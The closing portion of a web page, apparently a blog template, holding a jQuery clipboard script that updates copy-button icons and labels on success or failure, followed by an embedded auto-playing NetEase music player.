          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>



    
    <div id="music">
    
    
    
    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
        src="//music.163.com/outchain/player?type=2&id=27896818&auto=1&height=32"></iframe>
</div>

<style>
    #music {
        position: fixed;
        right: 15px;
        bottom: 0;
        z-index: 998;
    }
</style>
    
  </div>
</body>

</html>